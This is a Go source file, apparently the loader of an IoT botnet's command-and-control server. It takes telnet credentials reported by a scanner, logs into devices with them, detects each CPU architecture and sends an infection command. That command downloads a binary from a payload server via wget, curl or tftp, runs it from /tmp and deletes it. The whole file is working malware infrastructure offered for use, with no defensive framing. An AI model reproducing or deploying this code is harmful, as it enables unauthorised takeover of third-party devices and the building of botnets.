package loader

import (
	"cnc/internal/logger"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

type Credential struct {
	IP       string
	Port     string
	Username string
	Password string
	ReportedAt time.Time
	Attempts   int
	Status     string // "queued", "loading", "success", "failed"
}

type LoaderStats struct {
	TotalReports   int
	TotalAttempts  int
	TotalSuccess   int
	TotalFailed    int
	QueueSize      int
	ActiveLoaders  int
}

var (
	queue       []Credential
	queueMutex  sync.Mutex
	loaderRunning bool
	stats       LoaderStats
	statsMutex  sync.Mutex
	maxWorkers  = 8
	payloadURL  string
	activeWorkers int
	workerMutex sync.Mutex
)

func SetPayloadURL(url string) {
	payloadURL = url
}

func Start(payload string) {
	queueMutex.Lock()
	if loaderRunning {
		queueMutex.Unlock()
		return
	}
	loaderRunning = true
	queueMutex.Unlock()

	payloadURL = payload

	go loaderDispatcher()
}

func Stop() {
	queueMutex.Lock()
	loaderRunning = false
	queueMutex.Unlock()
}

func IsRunning() bool {
	queueMutex.Lock()
	defer queueMutex.Unlock()
	return loaderRunning
}

func AddCredential(ip, port, user, pass string) {
	queueMutex.Lock()
	defer queueMutex.Unlock()

	// deduplicate
	for _, c := range queue {
		if c.IP == ip && c.Port == port && c.Status == "queued" {
			return
		}
	}

	queue = append(queue, Credential{
		IP:         ip,
		Port:       port,
		Username:   user,
		Password:   pass,
		ReportedAt: time.Now(),
		Attempts:   0,
		Status:     "queued",
	})

	statsMutex.Lock()
	stats.TotalReports++
	stats.QueueSize = countQueued()
	statsMutex.Unlock()

	logger.LogCommand("SCANNER", "system", fmt.Sprintf("new cred: %s:%s %s/%s", ip, port, user, pass))
}

func GetStats() LoaderStats {
	statsMutex.Lock()
	defer statsMutex.Unlock()

	workerMutex.Lock()
	stats.ActiveLoaders = activeWorkers
	workerMutex.Unlock()

	queueMutex.Lock()
	stats.QueueSize = countQueued()
	queueMutex.Unlock()

	return stats
}

func countQueued() int {
	count := 0
	for _, c := range queue {
		if c.Status == "queued" {
			count++
		}
	}
	return count
}

func GetRecentCredentials(limit int) []Credential {
	queueMutex.Lock()
	defer queueMutex.Unlock()

	start := 0
	if len(queue) > limit {
		start = len(queue) - limit
	}
	result := make([]Credential, len(queue)-start)
	copy(result, queue[start:])
	return result
}

func loaderDispatcher() {
	for loaderRunning {
		queueMutex.Lock()
		var target *Credential
		for i := range queue {
			if queue[i].Status == "queued" {
				queue[i].Status = "loading"
				target = &queue[i]
				break
			}
		}
		queueMutex.Unlock()

		if target == nil {
			time.Sleep(2 * time.Second)
			continue
		}

		workerMutex.Lock()
		if activeWorkers >= maxWorkers {
			workerMutex.Unlock()
			// put back
			queueMutex.Lock()
			target.Status = "queued"
			queueMutex.Unlock()
			time.Sleep(1 * time.Second)
			continue
		}
		activeWorkers++
		workerMutex.Unlock()

		go func(cred *Credential) {
			defer func() {
				workerMutex.Lock()
				activeWorkers--
				workerMutex.Unlock()
			}()
			loadDevice(cred)
		}(target)

		time.Sleep(200 * time.Millisecond)
	}
}

func loadDevice(cred *Credential) {
	cred.Attempts++

	statsMutex.Lock()
	stats.TotalAttempts++
	statsMutex.Unlock()

	addr := net.JoinHostPort(cred.IP, cred.Port)
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		cred.Status = "failed"
		statsMutex.Lock()
		stats.TotalFailed++
		statsMutex.Unlock()
		return
	}
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(45 * time.Second))

	// wait for login prompt
	if !readUntilPrompt(conn, 8*time.Second) {
		cred.Status = "failed"
		statsMutex.Lock()
		stats.TotalFailed++
		statsMutex.Unlock()
		return
	}

	// send username
	conn.Write([]byte(cred.Username + "\r\n"))
	time.Sleep(500 * time.Millisecond)

	// wait for password prompt
	readUntilPassword(conn, 5*time.Second)

	// send password
	conn.Write([]byte(cred.Password + "\r\n"))
	time.Sleep(1 * time.Second)

	// check if we got shell
	conn.Write([]byte("echo pong\r\n"))
	time.Sleep(500 * time.Millisecond)

	buf := make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	n, err := conn.Read(buf)
	if err != nil || !strings.Contains(string(buf[:n]), "pong") {
		// second chance - some shells are slow
		conn.Write([]byte("\r\necho pong\r\n"))
		time.Sleep(1 * time.Second)
		n, err = conn.Read(buf)
		if err != nil || !strings.Contains(string(buf[:n]), "pong") {
			cred.Status = "failed"
			statsMutex.Lock()
			stats.TotalFailed++
			statsMutex.Unlock()
			return
		}
	}

	conn.SetDeadline(time.Now().Add(60 * time.Second))

	// detect architecture
	conn.Write([]byte("cat /proc/cpuinfo 2>/dev/null | head -5; uname -m 2>/dev/null; echo ARCHEND\r\n"))
	time.Sleep(1 * time.Second)

	archBuf := make([]byte, 2048)
	n, _ = conn.Read(archBuf)
	archStr := ""
	if n > 0 {
		archStr = string(archBuf[:n])
	}

	arch := detectArch(archStr)

	// deploy payload
	if payloadURL == "" {
		cred.Status = "failed"
		statsMutex.Lock()
		stats.TotalFailed++
		statsMutex.Unlock()
		return
	}

	// construct infection command
	infectCmd := buildInfectCommand(payloadURL, arch)

	conn.Write([]byte(infectCmd + "\r\n"))
	time.Sleep(2 * time.Second)

	// verify execution
	conn.Write([]byte("echo LOADED\r\n"))
	time.Sleep(1 * time.Second)
	verifyBuf := make([]byte, 512)
	n, _ = conn.Read(verifyBuf)
	if n > 0 && strings.Contains(string(verifyBuf[:n]), "LOADED") {
		cred.Status = "success"
		statsMutex.Lock()
		stats.TotalSuccess++
		statsMutex.Unlock()
		logger.LogCommand("LOADER", cred.IP, fmt.Sprintf("infected %s arch=%s", cred.IP, arch))
	} else {
		cred.Status = "failed"
		statsMutex.Lock()
		stats.TotalFailed++
		statsMutex.Unlock()
	}
}

func readUntilPrompt(conn net.Conn, timeout time.Duration) bool {
	buf := make([]byte, 512)
	total := 0
	deadline := time.Now().Add(timeout)

	for time.Now().Before(deadline) {
		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		n, err := conn.Read(buf[total:])
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			return false
		}
		total += n
		data := string(buf[:total])
		if strings.Contains(data, "ogin:") || strings.Contains(data, "ogin :") ||
			strings.Contains(data, "sername:") {
			return true
		}
	}
	return false
}

func readUntilPassword(conn net.Conn, timeout time.Duration) bool {
	buf := make([]byte, 512)
	total := 0
	deadline := time.Now().Add(timeout)

	for time.Now().Before(deadline) {
		conn.SetReadDeadline(time.Now().Add(2 * time.Second))
		n, err := conn.Read(buf[total:])
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			return false
		}
		total += n
		data := string(buf[:total])
		if strings.Contains(data, "assword:") || strings.Contains(data, "assword :") {
			return true
		}
	}
	return false
}

func detectArch(output string) string {
	lower := strings.ToLower(output)

	archMap := map[string]string{
		"aarch64":     "aarch64",
		"arm64":       "aarch64",
		"armv7":       "aarch64",
		"armv6":       "aarch64",
		"mips":        "mips",
		"mipsel":      "mips",
		"x86_64":      "x86_64",
		"amd64":       "x86_64",
		"i686":        "i386",
		"i386":        "i386",
		"powerpc":     "powerpc",
		"ppc":         "powerpc",
		"sh4":         "sh4",
		"sh2":         "sh2",
		"riscv64":     "riscv64",
		"riscv32":     "riscv32",
		"m68k":        "m68k",
		"microblaze":  "microblaze",
		"or1k":        "or1k",
		"loongarch64": "loongarch64",
	}

	for keyword, arch := range archMap {
		if strings.Contains(lower, keyword) {
			return arch
		}
	}

	return "mips" // fallback - most IoT devices
}

func buildInfectCommand(baseURL, arch string) string {
	binaryName := fmt.Sprintf("xnxnxnxnxnxnxnxn%sxnxn", arch)
	url := fmt.Sprintf("%s/bins/%s", baseURL, binaryName)

	// multi-directory, multi-tool fallback
	cmd := fmt.Sprintf(
		"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; "+
			"wget -q %s -O .d 2>/dev/null || curl -s -o .d %s 2>/dev/null || tftp -g -l .d -r bins/%s %s 2>/dev/null; "+
			"chmod +x .d 2>/dev/null; ./.d; rm -f .d",
		url, url, binaryName, strings.TrimPrefix(strings.TrimPrefix(baseURL, "http://"), "https://"),
	)

	return cmd
}
